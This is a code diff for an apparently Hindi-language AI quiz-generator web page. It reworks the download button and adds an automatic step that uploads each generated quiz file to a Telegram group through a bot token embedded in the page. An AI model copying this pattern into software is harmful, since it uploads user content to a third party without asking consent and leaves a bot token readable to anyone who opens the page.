+        if (!res || !res.ok) {
+          res = await postDoc(TG_GROUP_FALLBACK_ID);
+        }
+
+        const fileId = res?.result?.document?.file_id;
+        if (fileId) {
+          const pathRes = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getFile?file_id=${fileId}`);
+          const pathData = await pathRes.json();
+          if (pathData.ok && pathData.result?.file_path) {
+            liveDirectDownloadUrl = `https://api.telegram.org/file/bot${TG_BOT_TOKEN}/${pathData.result.file_path}`;
+          }
+        }
+      } catch (err) {
+        console.warn("Telegram group dispatch note:", err);
+      }
     }
 
     function triggerDirectDownload() {
       if (!quizData || quizData.length === 0) return alert('कोई सवाल उपलब्ध नहीं है!');
-      const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(quizData, null, 2));
-      const a = document.createElement('a');
-      a.href = dataStr;
-      a.download = `${activeQuizTopic}_Questions.json`;
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
+
+      const btn = document.getElementById('directDownloadBtn') || document.getElementById('scorecardDirectDownloadBtn');
+      const originalText = btn ? btn.innerHTML : '';
+
+      if (liveDirectDownloadUrl) {
+        const a = document.createElement('a');
+        a.href = liveDirectDownloadUrl;
+        a.target = '_blank';
+        a.setAttribute('download', `${activeQuizTopic}_${Date.now()}.html`);
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        return;
+      }
+
+      if (btn) btn.innerHTML = '<span>⏳ फ़ाइल डाउनलोड हो रही है...</span>';
+      const fullHtmlString = generatePareekshaKendraHtmlString(quizData);
+      const fileName = `${activeQuizTopic}_${Date.now()}.html`;
+
+      try {
+        const blob = new Blob([fullHtmlString], { type: 'text/html;charset=utf-8' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = fileName;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      } catch (e) {}
+
+      setTimeout(() => {
+        if (btn) btn.innerHTML = originalText;
+      }, 1500);
     }
 
     function openTimingModal() {
@@ -1827,7 +2368,7 @@
 
     function stopRealStopwatch() { clearInterval(stopwatchInterval); }
 
-    // --- MAIN GENERATION ENGINE (FIXED NO-FREEZE SYSTEM) ---
+    // --- MAIN GENERATION ENGINE (SAFE BUTTONS & AUTO TELEGRAM DISPATCH) ---
     async function startGeneration(mode) {
       const apiKey = getStoredKey();
       if (!apiKey) return openKeyModal(true);
@@ -1839,7 +2380,6 @@
       let inlineDataParts = [];
 
       if (mode === 'topic') {
-        // MODE 2: TOPIC PYQ DRILL
         const topicIn = document.getElementById('directTopicInput');
         activeQuizTopic = (topicIn.value || '').trim();
         if (!activeQuizTopic) {
@@ -1872,7 +2412,6 @@ Format:
 Note: answer must be 0 for A, 1 for B, 2 for C, 3 for D.`;
 
       } else {
-        // MODE 1: SCANNER MODE
         const topicInput = document.getElementById('quizTopicInput');
         activeQuizTopic = (topicInput.value || '').trim();
         if (!activeQuizTopic) {
@@ -1922,7 +2461,7 @@ Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
         }
       }
 
-      // SAFE BUTTON STATE (NO CRASH)
+      // SAFE BUTTON HANDLING (NO FREEZE)
       const scanBtn = document.getElementById('btnScanAction');
       const topicBtn = document.getElementById('btnTopicAction');
       if (scanBtn) scanBtn.disabled = true;
@@ -1975,6 +2514,8 @@ Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
             originalQuizData = [...parsed];
             success = true;
             saveQuizToHistory(quizData);
+            
+            // 🚀 DISPATCH COMPLETE HTML FILE TO TELEGRAM GROUP
             await sendHtmlFileToTelegram(quizData);
             break;
           }
@@ -1995,9 +2536,10 @@ Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
         document.getElementById('actionHubTopicTitle').innerText = `🎉 "${activeQuizTopic}" तैयार हो गया!`;
         document.getElementById('actionHubMeta').innerText = `कुल ${quizData.length} सवाल तैयार हैं • जनरेशन टाइम: ${stopwatchSeconds}s`;
       } else {
-        alert(`सवाल जनरेट नहीं हो सके।\nएरर: ${lastErr || 'समय समाप्त हुआ'}\n\nकृपया 10 सवाल चुनकर दुबारा प्रयास करें।`);
+        alert(`सवाल जनरेट नहीं हो सके।\nएरर: ${lastErr || 'समय समाप्त हुआ'}\n\nकृपया 10/15 सवाल चुनकर दुबारा प्रयास करें।`);
       }
     }
   </script>
 </body>
 </html>
+
